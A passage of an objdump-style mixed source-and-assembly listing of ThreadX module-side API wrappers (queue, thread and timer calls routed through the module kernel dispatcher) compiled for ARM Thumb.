    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_ALLOCATE_CALL, (ALIGN_TYPE) object_ptr, (ALIGN_TYPE) object_size, 0);
 80203c8:	4b04      	ldr	r3, [pc, #16]	; (80203dc <_txm_module_object_allocate+0x18>)
 80203ca:	f859 3003 	ldr.w	r3, [r9, r3]
 80203ce:	681c      	ldr	r4, [r3, #0]
 80203d0:	2300      	movs	r3, #0
 80203d2:	4601      	mov	r1, r0
 80203d4:	205f      	movs	r0, #95	; 0x5f
 80203d6:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 80203d8:	bd10      	pop	{r4, pc}
 80203da:	bf00      	nop
 80203dc:	00000004 	.word	0x00000004

080203e0 <_txm_module_object_pointer_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_object_pointer_get(UINT object_type, CHAR *name, VOID **object_ptr)
{
 80203e0:	b510      	push	{r4, lr}
 80203e2:	4613      	mov	r3, r2

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MODULE_OBJECT_POINTER_GET_CALL, (ALIGN_TYPE) object_type, (ALIGN_TYPE) name, (ALIGN_TYPE) object_ptr);
 80203e4:	4a04      	ldr	r2, [pc, #16]	; (80203f8 <_txm_module_object_pointer_get+0x18>)
 80203e6:	f859 2002 	ldr.w	r2, [r9, r2]
 80203ea:	6814      	ldr	r4, [r2, #0]
 80203ec:	460a      	mov	r2, r1
 80203ee:	4601      	mov	r1, r0
 80203f0:	205d      	movs	r0, #93	; 0x5d
 80203f2:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 80203f4:	bd10      	pop	{r4, pc}
 80203f6:	bf00      	nop
 80203f8:	00000004 	.word	0x00000004

080203fc <_txm_module_thread_shell_entry>:
/*                                                                        */
/*  10-15-2021      Scott Larson            Initial Version 6.1.9         */
/*                                                                        */
/**************************************************************************/
VOID  _txm_module_thread_shell_entry(TX_THREAD *thread_ptr, TXM_MODULE_THREAD_ENTRY_INFO *thread_info)
{
 80203fc:	b538      	push	{r3, r4, r5, lr}
 80203fe:	4605      	mov	r5, r0
 8020400:	460c      	mov	r4, r1
#endif


    /* Determine if this is the start thread.  If so, we must prepare the module for
       execution.  If not, simply skip the C startup code.  */
    if (thread_info -> txm_module_thread_entry_info_start_thread)
 8020402:	69cb      	ldr	r3, [r1, #28]
 8020404:	b983      	cbnz	r3, 8020428 <_txm_module_thread_shell_entry+0x2c>
    }

#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 8020406:	69a3      	ldr	r3, [r4, #24]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 8020408:	b113      	cbz	r3, 8020410 <_txm_module_thread_shell_entry+0x14>
    {

        /* Yes, notify application that this thread has been entered!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_ENTRY);
 802040a:	2100      	movs	r1, #0
 802040c:	4628      	mov	r0, r5
 802040e:	4798      	blx	r3
    }
#endif

    /* Call current thread's entry function.  */
    (thread_info -> txm_module_thread_entry_info_entry) (thread_info -> txm_module_thread_entry_info_parameter);
 8020410:	6923      	ldr	r3, [r4, #16]
 8020412:	6960      	ldr	r0, [r4, #20]
 8020414:	4798      	blx	r3


#ifndef TX_DISABLE_NOTIFY_CALLBACKS

    /* Pickup the entry/exit application callback routine again.  */
    entry_exit_notify =  thread_info -> txm_module_thread_entry_info_exit_notify;
 8020416:	69a3      	ldr	r3, [r4, #24]

    /* Determine if an application callback routine is specified.  */
    if (entry_exit_notify != TX_NULL)
 8020418:	b113      	cbz	r3, 8020420 <_txm_module_thread_shell_entry+0x24>
    {

        /* Yes, notify application that this thread has exited!  */
        (entry_exit_notify)(thread_ptr, TX_THREAD_EXIT);
 802041a:	2101      	movs	r1, #1
 802041c:	4628      	mov	r0, r5
 802041e:	4798      	blx	r3
    }
#endif

    /* Call actual thread suspension routine.  */
    _txm_module_thread_system_suspend(thread_ptr);
 8020420:	4628      	mov	r0, r5
 8020422:	f000 f817 	bl	8020454 <_txm_module_thread_system_suspend>
#ifdef TX_SAFETY_CRITICAL

    /* If we ever get here, raise safety critical exception.  */
    TX_SAFETY_CRITICAL_EXCEPTION(__FILE__, __LINE__, 0);
#endif
}
 8020426:	bd38      	pop	{r3, r4, r5, pc}
        _gcc_setup(thread_info -> txm_module_thread_entry_info_code_base_address);
 8020428:	68c8      	ldr	r0, [r1, #12]
 802042a:	f7ff fe39 	bl	80200a0 <_gcc_setup>
        _txm_module_entry_info =  thread_info;
 802042e:	4b07      	ldr	r3, [pc, #28]	; (802044c <_txm_module_thread_shell_entry+0x50>)
 8020430:	f859 3003 	ldr.w	r3, [r9, r3]
 8020434:	601c      	str	r4, [r3, #0]
        _txm_module_kernel_call_dispatcher =  thread_info -> txm_module_thread_entry_info_kernel_call_dispatcher;
 8020436:	6ae3      	ldr	r3, [r4, #44]	; 0x2c
 8020438:	4a05      	ldr	r2, [pc, #20]	; (8020450 <_txm_module_thread_shell_entry+0x54>)
 802043a:	f859 2002 	ldr.w	r2, [r9, r2]
 802043e:	6013      	str	r3, [r2, #0]
        while (!_txm_module_kernel_call_dispatcher)
 8020440:	2b00      	cmp	r3, #0
 8020442:	d0fd      	beq.n	8020440 <_txm_module_thread_shell_entry+0x44>
        _txe_thread_resume(thread_info -> txm_module_thread_entry_info_callback_request_thread);
 8020444:	6a20      	ldr	r0, [r4, #32]
 8020446:	f000 f881 	bl	802054c <_txe_thread_resume>
 802044a:	e7dc      	b.n	8020406 <_txm_module_thread_shell_entry+0xa>
 802044c:	00000008 	.word	0x00000008
 8020450:	00000004 	.word	0x00000004

08020454 <_txm_module_thread_system_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txm_module_thread_system_suspend(TX_THREAD *thread_ptr)
{
 8020454:	b510      	push	{r4, lr}
 8020456:	4601      	mov	r1, r0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SYSTEM_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8020458:	4b04      	ldr	r3, [pc, #16]	; (802046c <_txm_module_thread_system_suspend+0x18>)
 802045a:	f859 3003 	ldr.w	r3, [r9, r3]
 802045e:	681c      	ldr	r4, [r3, #0]
 8020460:	2300      	movs	r3, #0
 8020462:	461a      	mov	r2, r3
 8020464:	205c      	movs	r0, #92	; 0x5c
 8020466:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020468:	bd10      	pop	{r4, pc}
 802046a:	bf00      	nop
 802046c:	00000004 	.word	0x00000004

08020470 <_txe_queue_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_create(TX_QUEUE *queue_ptr, CHAR *name_ptr, UINT message_size, VOID *queue_start, ULONG queue_size, UINT queue_control_block_size)
{
 8020470:	b510      	push	{r4, lr}
 8020472:	b084      	sub	sp, #16

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) message_size;
 8020474:	9200      	str	r2, [sp, #0]
    extra_parameters[1] = (ALIGN_TYPE) queue_start;
 8020476:	9301      	str	r3, [sp, #4]
    extra_parameters[2] = (ALIGN_TYPE) queue_size;
 8020478:	9b06      	ldr	r3, [sp, #24]
 802047a:	9302      	str	r3, [sp, #8]
    extra_parameters[3] = (ALIGN_TYPE) queue_control_block_size;
 802047c:	9b07      	ldr	r3, [sp, #28]
 802047e:	9303      	str	r3, [sp, #12]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_CREATE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020480:	4b05      	ldr	r3, [pc, #20]	; (8020498 <_txe_queue_create+0x28>)
 8020482:	f859 3003 	ldr.w	r3, [r9, r3]
 8020486:	681c      	ldr	r4, [r3, #0]
 8020488:	466b      	mov	r3, sp
 802048a:	460a      	mov	r2, r1
 802048c:	4601      	mov	r1, r0
 802048e:	2022      	movs	r0, #34	; 0x22
 8020490:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020492:	b004      	add	sp, #16
 8020494:	bd10      	pop	{r4, pc}
 8020496:	bf00      	nop
 8020498:	00000004 	.word	0x00000004

0802049c <_txe_queue_receive>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_receive(TX_QUEUE *queue_ptr, VOID *destination_ptr, ULONG wait_option)
{
 802049c:	b510      	push	{r4, lr}
 802049e:	4613      	mov	r3, r2

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_RECEIVE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) destination_ptr, (ALIGN_TYPE) wait_option);
 80204a0:	4a04      	ldr	r2, [pc, #16]	; (80204b4 <_txe_queue_receive+0x18>)
 80204a2:	f859 2002 	ldr.w	r2, [r9, r2]
 80204a6:	6814      	ldr	r4, [r2, #0]
 80204a8:	460a      	mov	r2, r1
 80204aa:	4601      	mov	r1, r0
 80204ac:	202a      	movs	r0, #42	; 0x2a
 80204ae:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 80204b0:	bd10      	pop	{r4, pc}
 80204b2:	bf00      	nop
 80204b4:	00000004 	.word	0x00000004

080204b8 <_txe_queue_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 80204b8:	b510      	push	{r4, lr}
 80204ba:	4613      	mov	r3, r2

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 80204bc:	4a04      	ldr	r2, [pc, #16]	; (80204d0 <_txe_queue_send+0x18>)
 80204be:	f859 2002 	ldr.w	r2, [r9, r2]
 80204c2:	6814      	ldr	r4, [r2, #0]
 80204c4:	460a      	mov	r2, r1
 80204c6:	4601      	mov	r1, r0
 80204c8:	202b      	movs	r0, #43	; 0x2b
 80204ca:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 80204cc:	bd10      	pop	{r4, pc}
 80204ce:	bf00      	nop
 80204d0:	00000004 	.word	0x00000004

080204d4 <_txe_thread_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_create(TX_THREAD *thread_ptr, CHAR *name_ptr, VOID (*entry_function)(ULONG entry_input), ULONG entry_input, VOID *stack_start, ULONG stack_size, UINT priority, UINT preempt_threshold, ULONG time_slice, UINT auto_start, UINT thread_control_block_size)
{
 80204d4:	b510      	push	{r4, lr}
 80204d6:	b08a      	sub	sp, #40	; 0x28

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) entry_function;
 80204d8:	9201      	str	r2, [sp, #4]
    extra_parameters[1] = (ALIGN_TYPE) entry_input;
 80204da:	9302      	str	r3, [sp, #8]
    extra_parameters[2] = (ALIGN_TYPE) stack_start;
 80204dc:	9b0c      	ldr	r3, [sp, #48]	; 0x30
 80204de:	9303      	str	r3, [sp, #12]
    extra_parameters[3] = (ALIGN_TYPE) stack_size;
 80204e0:	9b0d      	ldr	r3, [sp, #52]	; 0x34
 80204e2:	9304      	str	r3, [sp, #16]
    extra_parameters[4] = (ALIGN_TYPE) priority;
 80204e4:	9b0e      	ldr	r3, [sp, #56]	; 0x38
 80204e6:	9305      	str	r3, [sp, #20]
    extra_parameters[5] = (ALIGN_TYPE) preempt_threshold;
 80204e8:	9b0f      	ldr	r3, [sp, #60]	; 0x3c
 80204ea:	9306      	str	r3, [sp, #24]
    extra_parameters[6] = (ALIGN_TYPE) time_slice;
 80204ec:	9b10      	ldr	r3, [sp, #64]	; 0x40
 80204ee:	9307      	str	r3, [sp, #28]
    extra_parameters[7] = (ALIGN_TYPE) auto_start;
 80204f0:	9b11      	ldr	r3, [sp, #68]	; 0x44
 80204f2:	9308      	str	r3, [sp, #32]
    extra_parameters[8] = (ALIGN_TYPE) thread_control_block_size;
 80204f4:	9b12      	ldr	r3, [sp, #72]	; 0x48
 80204f6:	9309      	str	r3, [sp, #36]	; 0x24

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_CREATE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80204f8:	4b05      	ldr	r3, [pc, #20]	; (8020510 <_txe_thread_create+0x3c>)
 80204fa:	f859 3003 	ldr.w	r3, [r9, r3]
 80204fe:	681c      	ldr	r4, [r3, #0]
 8020500:	ab01      	add	r3, sp, #4
 8020502:	460a      	mov	r2, r1
 8020504:	4601      	mov	r1, r0
 8020506:	2037      	movs	r0, #55	; 0x37
 8020508:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 802050a:	b00a      	add	sp, #40	; 0x28
 802050c:	bd10      	pop	{r4, pc}
 802050e:	bf00      	nop
 8020510:	00000004 	.word	0x00000004

08020514 <_txe_thread_entry_exit_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_entry_exit_notify(TX_THREAD *thread_ptr, VOID (*thread_entry_exit_notify)(TX_THREAD *notify_thread_ptr, UINT type))
{
 8020514:	b510      	push	{r4, lr}
 8020516:	460a      	mov	r2, r1

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_ENTRY_EXIT_NOTIFY_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) thread_entry_exit_notify, 0);
 8020518:	4b04      	ldr	r3, [pc, #16]	; (802052c <_txe_thread_entry_exit_notify+0x18>)
 802051a:	f859 3003 	ldr.w	r3, [r9, r3]
 802051e:	681c      	ldr	r4, [r3, #0]
 8020520:	2300      	movs	r3, #0
 8020522:	4601      	mov	r1, r0
 8020524:	2039      	movs	r0, #57	; 0x39
 8020526:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020528:	bd10      	pop	{r4, pc}
 802052a:	bf00      	nop
 802052c:	00000004 	.word	0x00000004

08020530 <_txe_thread_reset>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_reset(TX_THREAD *thread_ptr)
{
 8020530:	b510      	push	{r4, lr}
 8020532:	4601      	mov	r1, r0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESET_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8020534:	4b04      	ldr	r3, [pc, #16]	; (8020548 <_txe_thread_reset+0x18>)
 8020536:	f859 3003 	ldr.w	r3, [r9, r3]
 802053a:	681c      	ldr	r4, [r3, #0]
 802053c:	2300      	movs	r3, #0
 802053e:	461a      	mov	r2, r3
 8020540:	2041      	movs	r0, #65	; 0x41
 8020542:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020544:	bd10      	pop	{r4, pc}
 8020546:	bf00      	nop
 8020548:	00000004 	.word	0x00000004

0802054c <_txe_thread_resume>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_resume(TX_THREAD *thread_ptr)
{
 802054c:	b510      	push	{r4, lr}
 802054e:	4601      	mov	r1, r0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESUME_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8020550:	4b04      	ldr	r3, [pc, #16]	; (8020564 <_txe_thread_resume+0x18>)
 8020552:	f859 3003 	ldr.w	r3, [r9, r3]
 8020556:	681c      	ldr	r4, [r3, #0]
 8020558:	2300      	movs	r3, #0
 802055a:	461a      	mov	r2, r3
 802055c:	2042      	movs	r0, #66	; 0x42
 802055e:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020560:	bd10      	pop	{r4, pc}
 8020562:	bf00      	nop
 8020564:	00000004 	.word	0x00000004

08020568 <_tx_thread_sleep>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_sleep(ULONG timer_ticks)
{
 8020568:	b510      	push	{r4, lr}
 802056a:	4601      	mov	r1, r0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SLEEP_CALL, (ALIGN_TYPE) timer_ticks, 0, 0);
 802056c:	4b04      	ldr	r3, [pc, #16]	; (8020580 <_tx_thread_sleep+0x18>)
 802056e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020572:	681c      	ldr	r4, [r3, #0]
 8020574:	2300      	movs	r3, #0
 8020576:	461a      	mov	r2, r3
 8020578:	2043      	movs	r0, #67	; 0x43
 802057a:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 802057c:	bd10      	pop	{r4, pc}
 802057e:	bf00      	nop
 8020580:	00000004 	.word	0x00000004

08020584 <_txe_thread_time_slice_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_time_slice_change(TX_THREAD *thread_ptr, ULONG new_time_slice, ULONG *old_time_slice)
{
 8020584:	b510      	push	{r4, lr}
 8020586:	4613      	mov	r3, r2

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TIME_SLICE_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_time_slice, (ALIGN_TYPE) old_time_slice);
 8020588:	4a04      	ldr	r2, [pc, #16]	; (802059c <_txe_thread_time_slice_change+0x18>)
 802058a:	f859 2002 	ldr.w	r2, [r9, r2]
 802058e:	6814      	ldr	r4, [r2, #0]
 8020590:	460a      	mov	r2, r1
 8020592:	4601      	mov	r1, r0
 8020594:	2047      	movs	r0, #71	; 0x47
 8020596:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 8020598:	bd10      	pop	{r4, pc}
 802059a:	bf00      	nop
 802059c:	00000004 	.word	0x00000004

080205a0 <_txe_timer_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_create(TX_TIMER *timer_ptr, CHAR *name_ptr, VOID (*expiration_function)(ULONG), ULONG expiration_input, ULONG initial_ticks, ULONG reschedule_ticks, UINT auto_activate, UINT timer_control_block_size)
{
 80205a0:	b510      	push	{r4, lr}
 80205a2:	b086      	sub	sp, #24

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) expiration_function;
 80205a4:	9200      	str	r2, [sp, #0]
    extra_parameters[1] = (ALIGN_TYPE) expiration_input;
 80205a6:	9301      	str	r3, [sp, #4]
    extra_parameters[2] = (ALIGN_TYPE) initial_ticks;
 80205a8:	9b08      	ldr	r3, [sp, #32]
 80205aa:	9302      	str	r3, [sp, #8]
    extra_parameters[3] = (ALIGN_TYPE) reschedule_ticks;
 80205ac:	9b09      	ldr	r3, [sp, #36]	; 0x24
 80205ae:	9303      	str	r3, [sp, #12]
    extra_parameters[4] = (ALIGN_TYPE) auto_activate;
 80205b0:	9b0a      	ldr	r3, [sp, #40]	; 0x28
 80205b2:	9304      	str	r3, [sp, #16]
    extra_parameters[5] = (ALIGN_TYPE) timer_control_block_size;
 80205b4:	9b0b      	ldr	r3, [sp, #44]	; 0x2c
 80205b6:	9305      	str	r3, [sp, #20]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CREATE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80205b8:	4b05      	ldr	r3, [pc, #20]	; (80205d0 <_txe_timer_create+0x30>)
 80205ba:	f859 3003 	ldr.w	r3, [r9, r3]
 80205be:	681c      	ldr	r4, [r3, #0]
 80205c0:	466b      	mov	r3, sp
 80205c2:	460a      	mov	r2, r1
 80205c4:	4601      	mov	r1, r0
 80205c6:	204d      	movs	r0, #77	; 0x4d
 80205c8:	47a0      	blx	r4

    /* Return value to the caller.  */
    return(return_value);
}
 80205ca:	b006      	add	sp, #24
 80205cc:	bd10      	pop	{r4, pc}
 80205ce:	bf00      	nop
 80205d0:	00000004 	.word	0x00000004
